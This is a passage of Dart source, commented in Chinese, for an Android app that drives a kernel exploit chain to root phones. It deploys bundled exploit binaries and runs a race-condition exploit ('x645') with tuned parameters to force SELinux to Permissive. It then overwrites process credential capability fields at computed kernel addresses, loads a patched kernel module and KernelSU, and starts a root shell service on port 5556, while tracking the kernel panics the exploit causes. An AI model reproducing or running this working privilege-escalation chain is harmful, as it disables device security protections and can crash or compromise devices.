        phase = '已停止';
      } else if (allDoneOrSkipped) {
        phase = '已完成（含跳过）';
      }
      running = false;
      _lastEndAt = DateTime.now();
      _lastRunFailed = !success;
      _saveStats();
      _advice();
      notifyListeners();
      if (startCooldownLeft > 0) {
        _log('[start] 本轮结束：${_lastRunFailed ? (_rebootSeenInRun ? "检测到重启" : "未成功") : "成功"}'
            '，冷却 ${startCooldownLeft}s 后才能再次点「开始」（别连点：会让设备反复重启升温）');
      }
      // 跑完一轮：刷新一次状态（事件驱动的最后一个时机）
      refreshStatus();
    }
  }

  Future<void> stop() async {
    _stop = true;
    phase = '正在停止…';
    notifyListeners();
    // 注意：不能用 `pkill -f x645` —— 会匹配到承载它的 `sh -c` 自身，导致后续 pkill 不执行，
    // pc/pc_run 存活并继续占用 perf fd、污染下一轮。用 -x 精确匹配进程名，并拆成多条独立命令。
    await ShizukuShell.run('pkill -x x645');
    await ShizukuShell.run('pkill -x pc');
    await ShizukuShell.run('pkill -f "[p]c_run"');
    await ShizukuShell.run('rm -f $workDir/probe.log');
    _log('[stop] 已清理 x645 / pc');
  }

  // ---------------------------------------------------------------- 各阶段

  Future<void> _runEnv() async {
    _stage(StageId.env, StageStatus.running, detail: '检查 Shizuku…');
    phase = '环境检查';
    shizukuOk = await ShizukuShell.checkPermission();
    if (!shizukuOk) {
      shizukuOk = await ShizukuShell.requestPermission();
    }
    if (!shizukuOk) {
      _stage(StageId.env, StageStatus.failed, detail: 'Shizuku 未授权');
      lastError = 'Shizuku 未授权';
      _advice();
      _stop = true;
      return;
    }
    _log('[env] Shizuku OK, boot_id=$bootId');

    // ---------------- 环境预检：KernelSU 管理器 / su / 目录 ----------------
    // 为什么放最前面：⑦ 加载模块只要 10s，但 ⑧ 的 su 是**管理器**释放的。
    // 管理器没装时整条链跑到 ⑧ 才失败（3–6 分钟白跑），所以这里先拦。
    _stage(StageId.env, StageStatus.running, detail: '预检 KernelSU 管理器…');
    await _preflight();
    if (_stop) return;

    _stage(StageId.env, StageStatus.running, detail: '部署资产…');

    // 755：属主是 shell（可写），其他 App 不可替换（否则任何 App 都能替换 ksupatch/ksu_template 实现提权）
    final r = await ShizukuShell.run('mkdir -p $workDir && chmod 755 $workDir && echo MKDIR_OK');
    _log('[env] mkdir rc=${r.code} ${r.all}');
    if (r.code != 0 || !r.out.contains('MKDIR_OK')) {
      _stage(StageId.env, StageStatus.failed, detail: '目录不可写');
      return;
    }
    // 原生件在 APK 里以 gzip 存放（省 ~2MB 体积），部署时解压
    const assets = {
      'assets/x645.gz': 'x645',
      'assets/pc.gz': 'pc',
      'assets/module.ko': 'module.ko',
      'assets/ml2.gz': 'ml2',
      'assets/ksupatch.gz': 'ksupatch',
      'assets/ksu_template.ko.gz': 'ksu_template.ko',
      'assets/koquery.gz': 'koquery',
      'assets/kallsyms_6.12.58.bin.gz': 'ksyms.bin.gz',
    };
    for (final e in assets.entries) {
      if (_stop) return;
      try {
        final data = await rootBundle.load(e.key);
        var bytes = data.buffer.asUint8List();
        if (e.key.endsWith('.gz')) {
          bytes = Uint8List.fromList(gzip.decode(bytes));
        }
        if (e.value == 'module.ko') {
          bytes = _uniqueModuleName(bytes);
          try {
            bytes = _patchModuleAlias(bytes, calib.selinuxAliasHex);
          } catch (e) {
            // 别名改写是非必需步骤（模块内置本机型常量）；失败不应阻断整链
            _log('[env] 模块别名改写失败（改用内置常量）：$e');
          }
        }
        // 资产已在位且大小一致 ⇒ 不重复写（慢链路下省时间；校准仍会跑）
        if (assetsReady) {
          final st = await ShizukuShell.run(
              'wc -c < $workDir/${e.value} 2>/dev/null || echo 0');
          final have = int.tryParse(RegExp(r'\d+').firstMatch(st.out)?.group(0) ?? '') ?? 0;
          if (have == bytes.length) {
            _log('[env] ${e.value} 已存在（${(bytes.length / 1024).toStringAsFixed(0)}KB）跳过写入');
            continue;
          }
        }
        final w = await ShizukuShell.run(
          'cat > $workDir/${e.value} && chmod 755 $workDir/${e.value} && '
          'wc -c < $workDir/${e.value} && echo SIZE_END',
          stdin: bytes,
          timeoutMs: 180000,
        );
        final szm = RegExp(r'(\d+)\s*SIZE_END').firstMatch(w.out);
        final wroteOk = szm != null && int.tryParse(szm.group(1)!) == bytes.length;
        if (w.code != 0 || !wroteOk) {
          _stage(StageId.env, StageStatus.failed, detail: '写入 ${e.value} 失败');
          _log('[env] ${e.value}: rc=${w.code} 期望 ${bytes.length}B 实际 ${szm?.group(1) ?? "?"}B ${w.all}');
          return;
        }
        _log('[env] ${e.value} ✓ (${(bytes.length / 1024).toStringAsFixed(0)}KB)');
      } catch (ex) {
        _stage(StageId.env, StageStatus.failed, detail: 'asset ${e.key} 读取失败');
        _log('[env] $ex');
        return;
      }
    }
    // ★ 资产已就位（koquery 可执行），此时再校准：CRC / BTF / iomem 才拿得到
    await _ensureCalibrated();

    if (!calib.kernelKnown) {
      _stage(StageId.env, StageStatus.failed,
          detail: '未知内核：${calib.kernelVersion}（需手填物理基址或提供 boot.img）');
      lastError = '未知内核 ${calib.kernelVersion}：请到 选项→校准→「手填物理基址」'
          '填入该内核的物理基址（或提供 boot.img 推导），确认后再运行';
      _stop = true;
      _advice();
      return;
    }
    _stage(StageId.env, StageStatus.ok,
        detail: '资产已部署 · 内核 ${calib.kernelVersion}（${_kernelSourceText()}）');
    // 排障基线：版本 / 零写落点 / 设备指纹 / KSU 管理器与 su 现状
    _log('[diag:env] ver=$kAppVersion zero=${calib.selinuxZeroTargetHex} '
        'alias=${calib.selinuxAliasHex} phys=0x${calib.physBase.toRadixString(16)}');
    await _diag('env');
    _advice();
  }

  /// 自上而下探测设备现状：先从“最终目标”往回判，命中就一路跳过前面的步骤。
  Future<void> detectStatus() async {
    skipReason.clear();
    alreadyRooted = false;
    final r = await ShizukuShell.run(
        'KSUV_CACHE="\${ksuAppVersion}"; export KSUV_CACHE; '
        r'echo ENF=$(getenforce 2>/dev/null);'
        r' echo KSU=$(grep -c "^kernelsu" /proc/modules 2>/dev/null || echo 0);'
        r' echo MODS=$(grep -cE "^(pwnm|pwn3|pwnf)" /proc/modules 2>/dev/null || echo 0);'
        r' echo ASSET=$(ls /data/local/tmp/rk/x645 /data/local/tmp/rk/pc /data/local/tmp/rk/ksupatch /data/local/tmp/rk/ml2 2>/dev/null | wc -l);'
        r' echo SUC=$(timeout 4 su -c id -u 2>/dev/null | tr -dc 0-9 | head -c 1);'
        r' echo UID=$(id -u);'
        // 轻量判断：pm path 比 "pm list packages | grep"（要枚举全部包）快一个量级
        r' echo KSUAPP=$([ -n "$(pm path me.weishu.kernelsu 2>/dev/null)" ] && echo 1 || echo 0);'
        r' echo KSUDIR=$(ls -d /data/adb/ksu 2>/dev/null | head -1);'
        r' echo SUWHICH=$(command -v su 2>/dev/null || ls /data/adb/ksu/bin/su 2>/dev/null || echo);'
        // dumpsys package 很重（binder + 枚举），只在还没拿到版本时查一次
        r' echo KSUV=$([ -z "$KSUV_CACHE" ] && dumpsys package me.weishu.kernelsu 2>/dev/null'
        r' | sed -n "s/.*versionName=//p" | head -1);'
        r' echo RESET=$(getprop sys.resettype 2>/dev/null);'
        r' echo LASTB=$(getprop sys.boot.reason.last 2>/dev/null);');
    for (final l in r.out.split('\n')) {
      if (l.startsWith('KSUAPP=') || l.startsWith('KSUDIR=') || l.startsWith('SUWHICH=')) {
        _log('[status] ${l.trim()}');
      }
    }
    // ↓ 供 preflight 与界面使用
    ksuAppInstalled = (RegExp(r'^KSUAPP=(\d+)', multiLine: true)
            .firstMatch(r.out)
            ?.group(1) ?? '0') != '0';
    ksuDirReady = RegExp(r'^KSUDIR=/', multiLine: true).hasMatch(r.out);
    suPath = RegExp(r'^SUWHICH=(\S+)', multiLine: true).firstMatch(r.out)?.group(1) ?? '';
    ksuAppVersion = _normVer(
        RegExp(r'^KSUV=(\S+)', multiLine: true).firstMatch(r.out)?.group(1) ?? '');
    lastResetType =
        RegExp(r'^RESET=(\S+)', multiLine: true).firstMatch(r.out)?.group(1) ?? '';
    if (lastResetType.toLowerCase().contains('panic') ||
        lastResetType.toLowerCase().contains('abnormal')) {
      _log('[status] 上次重启类型=$lastResetType（kernel panic ⇒ 命中后落地失败，属已知代价）');
    }
    final m = <String, String>{};
    for (final line in r.out.split('\n')) {
      final i = line.indexOf('=');
      if (i > 0) m[line.substring(0, i).trim()] = line.substring(i + 1).trim();
    }
    final enf = m['ENF'] ?? '';
    final ksu = int.tryParse(m['KSU'] ?? '0') ?? 0;
    final mods = int.tryParse(m['MODS'] ?? '0') ?? 0;
    final asset = int.tryParse(m['ASSET'] ?? '0') ?? 0;
    final suc = (m['SUC'] ?? '') == '0';

    // ① 终局：su 已可用 ⇒ 已经越狱，整条链一步都不用跑
    if (suc) {
      alreadyRooted = true;
      for (final id in StageId.values) {
        skipReason[id] = '已越狱（su 可用），无需操作';
      }
      devState = '已越狱 · su 可用（${suPath.isEmpty ? "PATH" : suPath}）· '
          'KSU ${ksu > 0 ? "已加载" : "未加载"}';
      phase = '已越狱成功（无需操作）';
      _log('[status] $devState');
      _log('[status] 已越狱：全部阶段视为完成');
      for (final id in StageId.values) {
        _stage(id, StageStatus.skipped, detail: '已越狱（su 可用）');
      }
      _advice();
      notifyListeners();
      return;
    }

    // ② 有 root 模块但 KSU 未加载 ⇒ 从 ⑥ 起（①–⑤ 全部满足）
    if (mods > 0 && ksu == 0) {
      for (final id in const [
        StageId.env,
        StageId.permissive,
        StageId.probe,
        StageId.phase1,
        StageId.phase2,
        StageId.root,
      ]) {
        skipReason[id] = '已有 root 模块（pwn*）在运行';
      }
    }

    // ③ 单项满足即可跳过
    if (enf == 'Permissive' && !skipReason.containsKey(StageId.permissive)) {
      skipReason[StageId.permissive] = 'SELinux 已是 Permissive';
    }
    assetsReady = asset >= 4;   // 资产已在位：_runEnv 里跳过重复写入，但校准照跑
    if (mods > 0 && ksu == 0) {
      for (final id in const [
        StageId.env,
        StageId.permissive,
        StageId.probe,
        StageId.phase1,
        StageId.phase2,
        StageId.root,
      ]) {
        _stage(id, StageStatus.skipped, detail: '已有 root 模块（pwn*）');
      }
      phase = '已有 root，待加载 KernelSU';
    }
    if (ksu > 0) {
      skipReason[StageId.ksu] = 'KernelSU 已加载';
      if (skipReason.containsKey(StageId.root)) {
        skipReason[StageId.root] = '已有 root 模块在运行（kernelsu 已加载）';
      }
    }

    health['E'] = enf;
    health['G'] = '$mods';
    health['K'] = '$ksu';
    health['A'] = '$asset';
    health['S'] = suc || suPath.isNotEmpty ? '1' : '0';
    devState = composeDevState();
    _log('[status] $devState');
    if (ksuAppInstalled && ksuAppVersion.isNotEmpty && ksuAppVersion != kKsuManagerVersion) {
      _log('[status] ⚠ KernelSU 管理器 v$ksuAppVersion 与本模板内核（v$kKsuManagerVersion）不同；'
          '若 ⑦⑧ 异常，先换回 v$kKsuManagerVersion 再试');
    }
    if (skipReason.isNotEmpty) {
      _log('[status] 可跳过：${skipReason.keys.map((k) => k.name).join("、")}');
    }
    notifyListeners();
  }

  /// 校准（若需要）：首次 / 换 boot / 有失败项；本 boot 已校准则直接跳过
  Future<void> _ensureCalibrated() async {
    try {
      final saved = await Calibration.load();
      calib.applyFrom(saved);
      final curBoot =
          (await ShizukuShell.run('cat /proc/sys/kernel/random/boot_id')).out.trim();
      final need = calib.vermagic.isEmpty ||
          calib.items.isEmpty ||
          (saved.bootId.isNotEmpty && curBoot.isNotEmpty && saved.bootId != curBoot) ||
          calib.items.any((e) => !e.ok);
      if (!need) {
        _log('[calib] 使用已保存校准（同 boot）：内核=${calib.kernelVersion} '
            'phys=0x${calib.physBase.toRadixString(16)} alias=${calib.selinuxAliasHex}');
        return;
      }
      _log(calib.vermagic.isEmpty ? '[calib] 首次运行，自动校准…' : '[calib] 需要重新校准…');
      await calib.detect(log: _log);
      final bad = calib.items.where((e) => !e.ok).length;
      _log('[calib] 内核=${calib.kernelVersion} 基址来源=${_kernelSourceText()} '
          'phys=0x${calib.physBase.toRadixString(16)} alias=${calib.selinuxAliasHex}');
      _log('[calib] 完成：${calib.items.length - bad}/${calib.items.length} 项通过'
          '${bad > 0 ? "（失败项见 选项→重新校准）" : ""}');
    } catch (e) {
      _log('[calib] 校准异常（用默认值）：$e');
    }
  }

  /// 所有阶段是否都处于「完成或已满足跳过」——用于界面显示完成态
  bool get allDoneOrSkipped => stages.every((s) =>
      s.status == StageStatus.ok || s.status == StageStatus.skipped);

  bool statusOkOrSkipped(StageId id) {
    final st = _byId[id]!.status;
    return st == StageStatus.ok || st == StageStatus.skipped;
  }

  String _kernelSourceText() {
    switch (calib.kernelSource) {
      case 'builtin':
        return '内置记录';
      case 'custom':
        return '自定义记录';
      case 'iomem':
        return 'iomem 探测';
      default:
        return '未知';
    }
  }

  Future<void> _runPermissive() async {
    final s = _byId[StageId.permissive]!;
    _stage(StageId.permissive, StageStatus.running);
    phase = 'permissive';
    for (var run = 0; run < 4 && !_stop; run++) {
      s.runs++;
      await ShizukuShell.run(_prepCmd());
      final logPath = '$workDir/s0_${_ts()}.log';
      final env = 'P645_STAGE=1 P645_STAGE_FROM=0 P645_STAGE_TO=1 P645_STAGE_TRIES=4 P645_ATTEMPTS=1 '
          'P645_KIDS=0 P645_CRED_FARM=0 P645_DRAIN_AFTER=0 P645_THREAD_FILL=0 P645_FILL_SELF=0 '
          'P645_LEAK_FORK=0 P645_FORK_AFTER=0 P645_PRE_UM_MB=0 P645_TIMERS=54000 P645_REPEATS=520 '
          'P645_NDEL=7 P645_DEL_RUN_MS=2500 P645_CONC=1 P645_ANON_MB=8 P645_FREEZE=1 P645_V8=1 '
          'P645_DRAIN_WAIT_MS=25000 P645_PIPE512=64 P645_SOCKS=64 P645_SOCK_MB=8 P645_UHID=0 '
          'P645_MODE=4 P645_ANON2_MB=1024 P645_PIPE_DRAIN=1 P645_PIPE_K=4 P645_SCAN_STOP=1 '
          'P645_THRESH=32 P645_RING_GO=0 P645_FORCE_LEFT=${calib.selinuxZeroTargetHex} P645_LOG=$logPath';
      // 温度闸：>58°C 先降温再打（实测机身烫时命中率崩、panic 概率上升）
      await _cooldownGate();
      _log('[permissive] run ${run + 1}: 开打（约 30–60s）');
      final r = await ShizukuShell.run(
        'cd $workDir && chmod 755 x645 && $env ./x645 2>&1; echo "RC=\$?"',
        timeoutMs: 300000,
      );
      _log(r.all);
      final lg = await ShizukuShell.run('cat $logPath 2>/dev/null');
      _countTries(lg.out);
      final enf = await ShizukuShell.run('getenforce');
      if (enf.out.trim() == 'Permissive') {
        s.hits = s.hits == 0 ? 1 : s.hits;
        _stage(StageId.permissive, StageStatus.ok, detail: '已 permissive');
        _advice();
        return;
      }
      if (await _rebooted()) {
        _stage(StageId.permissive, StageStatus.failed, detail: '设备重启');
        lastError = '设备已重启（命中后延迟 panic）。等桌面恢复后点「重启」做一次正常重启，再重新运行';
        _stop = true;
        return;
      }
      _advice();
    }
    _stage(StageId.permissive, StageStatus.failed, detail: 'permissive 未成功');
    lastError = 'permissive 未成功';
    _advice();
  }

  /// 成功后清理：停 root shell 服务、删掉落盘的原生件与临时/证据文件。
  /// 注意：已 insmod 的模块不受影响；下次运行会在 env 阶段重新部署。
  Future<void> cleanupAfterSuccess() async {
    if (!optCleanup) {
      _log('[clean] 已关闭"成功后清理"，跳过');
      return;
    }
    _log('[clean] 清理残留：停 root shell / 删原生件与临时文件…');
    // ① 停掉 5556 root shell 服务（候选进程会 fork 一个常驻服务）
    await ShizukuShell.run('pkill -x pc');
    await ShizukuShell.run('pkill -x x645');
    // ② 删临时产物（保留 workDir 下的日志到清理前先不删，便于排查）
    final r = await ShizukuShell.run(
      'rm -f /tmp/ksyms.txt /tmp/kt*.ko /data/local/tmp/kt*.ko '
      '/data/local/tmp/ROOTED_* /data/local/tmp/shizuku.log 2>/dev/null; '
      'rm -rf $workDir/pc $workDir/x645 $workDir/ml2 $workDir/ksupatch '
      '$workDir/koquery $workDir/ksu_template.ko $workDir/ksu_run.ko '
      '$workDir/module.ko $workDir/ksyms.bin.gz 2>/dev/null; '
      'ls $workDir 2>/dev/null | tr "\n" " "; echo; echo CLEAN_OK');
    _log('[clean] 剩余（仅日志）：${r.out.split('\n').first}');
  }

  /// 软重启：只重启 Android 框架（zygote/system_server），不动内核
  /// —— KSU 模块还在、SELinux 状态保留，但 App 列表/管理器状态会刷新
  Future<bool> softReboot() async {
    softRebootTried = true;
    _log('[soft] 尝试软重启（ctl.restart zygote）…');
    // 有 root 时优先用 root 通道，成功率更高
    var r = await ShizukuShell.run(
        'su -c "setprop ctl.restart zygote; echo SOFT_OK" 2>&1 | tail -2');
    if (!r.out.contains('SOFT_OK')) {
      r = await ShizukuShell.run('setprop ctl.restart zygote; echo SOFT_OK2');
    }
    final ok = r.out.contains('SOFT_OK');
    _log('[soft] ${ok ? '已发出软重启' : '软重启被拒（${r.all.trim()}）'}');
    if (!ok) {
      _log('[soft] 回退：正常重启（点右上角「重启」，或这里的 reboot）');
    }
    notifyListeners();
    return ok;
  }

  /// 设备健康 / slab 检查（温度、唤醒、内存、posix_timers_cache、cred_jar、SELinux）
  Future<void> refreshHealth({bool force = false}) async {
    // 跑链期间一律不读（slabinfo/dumpsys 都会干扰竞态）；只有显式 force 的一次性调用例外
    if (running && !force) return;
    final r = await ShizukuShell.run(
        'echo "T=\$(cat /sys/class/thermal/thermal_zone0/temp 2>/dev/null)";'
        'echo "W=\$(dumpsys power 2>/dev/null | grep -m1 mWakefulness= | cut -d= -f2)";'
        'echo "M=\$(free -m 2>/dev/null | awk \'/Mem:/{print \$3\"/\"\$2}\')";'
        'echo "P=\$(grep -m1 posix_timers_cache /proc/slabinfo 2>/dev/null | awk \'{print \$2\"/\"\$3}\')";'
        'echo "C=\$(grep -m1 \"^cred_jar\" /proc/slabinfo 2>/dev/null | awk \'{print \$2\"/\"\$3}\')";'
        'echo "E=\$(getenforce 2>/dev/null)"'
        '; echo "G=\$(grep -cE \"^pwn\" /proc/modules 2>/dev/null || echo 0)"'
        '; echo "K=\$(grep -c \"^kernelsu\" /proc/modules 2>/dev/null || echo 0)"'
        '; echo "A=\$(ls /data/local/tmp/rk/x645 /data/local/tmp/rk/pc /data/local/tmp/rk/ksupatch /data/local/tmp/rk/ml2 2>/dev/null | wc -l)"'
        '; echo "S=\$(command -v su >/dev/null 2>&1 && echo 1 || ([ -x /data/adb/ksud ] && echo 1) || echo 0)"');
    var changed = false;
    for (final line in r.out.split('\n')) {
      final i = line.indexOf('=');
      if (i <= 0) continue;
      final k = line.substring(0, i).trim();
      final v = line.substring(i + 1).trim();
      if (k == 'T' || k == 'W' || k == 'M' || k == 'P' || k == 'C' || k == 'E' ||
          k == 'G' || k == 'K' || k == 'A' || k == 'S') {
        if (health[k] != v) {
          health[k] = v;
          changed = true;
        }
      }
    }
    if (r.via.isNotEmpty && shizukuVia != r.via) {
      shizukuVia = r.via;
      _log('[env] Shizuku 接口: ${r.via == 'api' ? 'Shizuku.newProcess' : 'AIDL newProcess'}');
      changed = true;
    }
    // 拿到数据说明 Shizuku 通了 ⇒ 打开 App 后就能开始轮询（之前只有 start() 里才置位）
    if (r.via.isNotEmpty && !shizukuOk) shizukuOk = true;
    // 「现状」那行也跟着 5s 刷新（和温度同一节奏）
    if (health['E'] != null) {
      final ds = composeDevState();
      if (ds != devState) {
        devState = ds;
        changed = true;
      }
    }
    // 每 5s 轮询时值通常不变，没必要刷新整屏
    if (changed) notifyListeners();
  }

  /// 「现状」那一行的文字（detectStatus 与 5s 轮询共用）
  ///
  /// 只依赖 health 里的轻量字段（E/G/K/A/S）与探测到的管理器信息，
  /// 所以可以每 5 秒算一次，不会像 pm list packages 那样重。
  String composeDevState() {
    final enf = (health['E'] ?? '').trim();
    final pwn = int.tryParse((health['G'] ?? '0').trim()) ?? 0;
    final ksu = int.tryParse((health['K'] ?? '0').trim()) ?? 0;
    final asset = int.tryParse((health['A'] ?? '0').trim()) ?? 0;
    final hasSu = (health['S'] ?? '0').trim() == '1';
    final ksuAppText = ksuAppInstalled
        ? 'KSU 管理器 ${ksuAppVersion.isEmpty ? "已装" : "v$ksuAppVersion"}'
        : 'KSU 管理器 未装';
    return [
      if (enf.isEmpty) 'SELinux=?' else 'SELinux=$enf',
      if (ksu > 0) 'KSU 已加载' else if (pwn > 0) 'root 模块已加载 · KSU 未加载' else 'KSU 未加载',
      ksuAppText,
      hasSu ? 'su 可用${suPath.isEmpty ? "" : "（$suPath）"}' : 'su 不可用',
      '资产 $asset/4',
      if (lastResetType.toLowerCase().contains('panic')) '上次=panic 重启',
    ].join(' · ');
  }

  /// 一次性刷新（重）：健康条 + detectStatus
  ///
  /// 触发时机：打开 App、Shizuku 授权成功、切回前台、跑完一轮后。
  /// **跑链期间直接 return** —— 运行时的检测逻辑回到 v1.0.16（不做 detectStatus / slabinfo），
  /// 因为 v1.0.17 曾用 3s/5s 定时器在竞态窗口里跑这些重活，把 panic 率从 12% 推到 100%。
  Future<void> refreshStatus({bool withDetect = true}) async {
    if (running) return;          // 跑链期间一律不探测
    await refreshHealth(force: true);
    if (withDetect) {
      try {
        await detectStatus();
      } catch (_) {}
    }
  }

  /// 空闲期：每 5 秒刷新状态；**跑链期间完全不刷**（运行时的行为回到 v1.0.16：
  /// 只有开打前的一次温度闸 + 20s 心跳的 prep，不做 detectStatus/slabinfo 这类重活）。
  void startHealthPolling() {
    _healthTimer?.cancel();
    refreshStatus(); // 先立刻刷一次，别等第一个 5s
    _healthTimer = Timer.periodic(const Duration(seconds: 5), (_) async {
      if (_healthBusy || running) return;
      _healthBusy = true;
      try {
        // 死锁修复：原来守卫是 if(!shizukuOk) return，而 shizukuOk 只在 refreshHealth 成功时置位
        if (!shizukuOk) {
          final ok = await ShizukuShell.checkPermission();
          if (!ok) return;
          shizukuOk = true;
          _log('[health] Shizuku 已授权，开始每 5s 刷新状态');
        }
        await refreshHealth();   // 只刷健康条（轻量），不跑 detectStatus
      } catch (_) {
      } finally {
        _healthBusy = false;
      }
    });
  }

  void stopHealthPolling() {
    _healthTimer?.cancel();
    _healthTimer = null;
  }

  Future<bool> _rebooted() async {
    final b = await _bootId();
    if (b.isNotEmpty && bootId.isNotEmpty && b != bootId) {
      bootId = b;
      _rebootSeenInRun = true;   // 本轮遇到过重启 ⇒ 冷却时间加倍（180s）
      return true;
    }
    return false;
  }

  Future<void> _runProbe() async {
    _stage(StageId.probe, StageStatus.running);
    phase = '候选进程';
    for (var run = 0; run < 3 && !_stop; run++) {
      final r = await ShizukuShell.run(
          'cd $workDir && rm -f probe.log && chmod 755 pc module.ko && '
          'pkill -x pc 2>/dev/null; '
          'nohup setsid ./pc ${calib.tracepointId} 14 $workDir/module.ko > $workDir/probe.log 2>&1 < /dev/null & echo started');
      _log('[probe] ${r.all}');
      await _sleep(6000);
      final cat = await ShizukuShell.run('cat $workDir/probe.log');
      List<BigInt> creds;
      try {
        creds = _parseCreds(cat.out);
      } catch (e) {
        _log('[probe] 解析失败: $e');
        creds = const <BigInt>[];
      }
      _log('[probe] 捕获 cred ${creds.length} 个');
      for (final c in creds) {
        _log('[probe] cred=${_hex(c)} bit16=${(c >> 16) & BigInt.one}');
      }
      if (creds.isNotEmpty) {
        _stage(StageId.probe, StageStatus.ok, detail: '${creds.length} 个候选');
        _advice();
        return;
      }
      if (await _rebooted()) {
        _stage(StageId.probe, StageStatus.failed, detail: '设备重启');
        _stop = true;
        return;
      }
    }
    _stage(StageId.probe, StageStatus.failed, detail: '无候选（perf 不可用/未 permissive）');
    lastError = '候选进程没有产出 cred';
    _advice();
  }

  Future<List<BigInt>> _currentCreds() async {
    final cat = await ShizukuShell.run('cat $workDir/probe.log');
    return _parseCreds(cat.out);
  }

  Future<String> _runShot({
    required StageId stage,
    required int stageFrom,
    required int tries,
    String? tryList,
    int timeoutMs = 300000,
  }) async {
    final s = _byId[stage]!;
    s.runs++;
    final logPath = '$workDir/${stage.name}_${_ts()}.log';
    var env = 'P645_STAGE=1 P645_STAGE_FROM=$stageFrom P645_STAGE_TO=2 P645_STAGE_TRIES=$tries '
        'P645_ATTEMPTS=1 P645_KIDS=0 P645_CRED_FARM=0 P645_DRAIN_AFTER=0 P645_THREAD_FILL=0 '
        'P645_FILL_SELF=0 P645_LEAK_FORK=0 P645_FORK_AFTER=0 P645_PRE_UM_MB=0 P645_TIMERS=54000 '
        'P645_REPEATS=520 P645_NDEL=7 P645_DEL_RUN_MS=2500 P645_CONC=1 P645_ANON_MB=8 P645_FREEZE=1 '
        'P645_V8=1 P645_DRAIN_WAIT_MS=25000 P645_PIPE512=64 P645_SOCKS=64 P645_SOCK_MB=8 P645_UHID=0 '
        'P645_MODE=4 P645_ANON2_MB=1024 P645_PIPE_DRAIN=1 P645_PIPE_K=4 P645_SCAN_STOP=1 '
        'P645_THRESH=32 P645_RING_GO=0 P645_LOG=$logPath';
    if (tryList != null && tryList.isNotEmpty) {
      env += " P645_TRY_LIST='$tryList'";
    }
    await ShizukuShell.run(_prepCmd());
    await ShizukuShell.run('pkill -x x645'); // 清掉上一发可能残留的孤儿，避免两份并发污染判据
    _log('[${stage.name}] 开打 tries=$tries');
    final r = await ShizukuShell.run(
      'cd $workDir && $env ./x645 2>&1; echo "RC=\$?"',
      timeoutMs: timeoutMs,
    );
    if (r.all.isNotEmpty) _log(r.all);
    if (r.code == -9) {
      _log('[${stage.name}] 超时，清理残留 x645');
      await ShizukuShell.run('pkill -x x645');
    }
    final lg = await ShizukuShell.run('cat $logPath 2>/dev/null');
    return lg.out;
  }

  Future<void> _runPhase1() async {
    final s = _byId[StageId.phase1]!;
    _stage(StageId.phase1, StageStatus.running);
    phase = 'phase1 cap_bset';
    for (var run = 0; run < 3 && !_stop; run++) {
      final creds = await _currentCreds();
      if (creds.isEmpty) {
        _stage(StageId.phase1, StageStatus.failed, detail: '候选消失');
        return;
      }
      final targets =
        creds
            .take(8)
            .map((c) => _hex(c + BigInt.from(calib.offCapBset)))
            .join(',');
      final lg = await _runShot(
        stage: StageId.phase1,
        stageFrom: 1,
        tries: 8,
        tryList: targets,
      );
      _countTries(lg, phase1OrPhase2: StageId.phase1);
      final v = await _pollVerdict('CAPBND_ZERO', 60);
      if (v != null) {
        s.hits = s.hits == 0 ? 1 : s.hits;
        _log('[phase1] HIT: $v');
        _stage(StageId.phase1, StageStatus.ok, detail: v);
        _advice();
        return;
      }
      if (await _rebooted()) {
        _stage(StageId.phase1, StageStatus.failed, detail: '设备重启');
        _stop = true;
        return;
      }
      _advice();
    }
    _stage(StageId.phase1, StageStatus.failed, detail: 'cap_bset 未落地');
    lastError = 'cap_bset 未落地';
    _advice();
  }

  Future<void> _runPhase2() async {
    final s = _byId[StageId.phase2]!;
    _stage(StageId.phase2, StageStatus.running);
    phase = 'phase2 cap_effective';
    for (var run = 0; run < 3 && !_stop; run++) {
      final v1 = await _pollVerdict('CAPBND_ZERO', 5, writeLog: false);
      String? cred;
      if (v1 != null) {
        // 取**最后**一条（最新命中），firstMatch 会拿到上一发的旧候选
        final all = RegExp(r'CRED=(0x[0-9a-fA-F]+)').allMatches(v1).toList();
        cred = all.isEmpty ? null : all.last.group(1);
      }
      if (cred == null) {
        final creds = await _currentCreds();
        if (creds.isEmpty) {
          _stage(StageId.phase2, StageStatus.failed, detail: '找不到已清零的候选');
          return;
        }
        cred = _hex(creds.first);
      }
      final c = _fromHex(cred);
      final p = _hex(c + BigInt.from(calib.offCapPermitted));
      final ch = _hex(c + BigInt.from(calib.offCapEffective));
      final list = '3:$p:$ch,3:$p:$ch,3:$p:$ch';
      final lg = await _runShot(
        stage: StageId.phase2,
        stageFrom: 1,
        tries: 5,
        tryList: list,
      );
      _countTries(lg, phase1OrPhase2: StageId.phase2);
      final v = await _pollVerdict('CAPEFF_OK', 90);
      if (v != null) {
        s.hits = s.hits == 0 ? 1 : s.hits;
        _log('[phase2] HIT: $v');
        _stage(StageId.phase2, StageStatus.ok, detail: v);
        _advice();
        return;
      }
      if (await _rebooted()) {
        _stage(StageId.phase2, StageStatus.failed, detail: '设备重启');
        _stop = true;
        return;
      }
      _advice();
    }
    _stage(StageId.phase2, StageStatus.failed, detail: 'cap_effective 未落地');
    lastError = 'cap_effective 未落地';
    _advice();
  }

  Future<String?> _pollVerdict(String pattern, int seconds,
      {bool writeLog = true}) async {
    for (var i = 0; i < seconds; i += 2) {
      if (_stop) return null;
      final r = await ShizukuShell.run(
          'grep -aE "$pattern" $workDir/probe.log 2>/dev/null | tail -2');
      final t = r.out.trim();
      if (t.isNotEmpty) {
        if (writeLog) _log('[verdict] $t');
        return t;
      }
      await _sleep(2000);
    }
    return null;
  }

  Future<void> _runRoot() async {
    _stage(StageId.root, StageStatus.running, detail: '等模块加载…');
    phase = '加载模块';
    final v = await _pollVerdict('ROOT_OK', 90);
    if (v != null) {
      _stage(StageId.root, StageStatus.ok, detail: v.split('\n').last);
      // 有 root 了：核对内核镜像 + 看 dmesg 里 KSU/模块的落地情况
      await _diagRoot('root');
      // 顺手把「上次为什么重启」也抓下来（pstore/ramoops 只有 root 能读）
      await collectLastCrash();
      _advice();
      return;
    }
    // 模块没加载：看 probe 日志里的错误
    final r = await ShizukuShell.run(
        'grep -aE "FINIT|INITMOD|TRYLOAD|AFTER_MOD|KLOG" $workDir/probe.log | tail -12');
    if (r.out.trim().isNotEmpty) _log(r.all);
    _stage(StageId.root, StageStatus.failed, detail: '模块未加载');
    lastError = '模块未加载（看日志 FINIT errno）';
    _advice();
  }

  /// su 现在能不能用（KernelSU 的 su 是"虚拟"的：文件不存在也能被内核劫持）
  /// KernelSU 版本号规范化
  ///
  /// 坑：Honor 的 `dumpsys package` 输出 `versionName=v3.3.1`（自带 v 前缀），
  /// 直接拼 " v$ver" 就成了 `vv3.3.1`，还会让版本比较假报警。
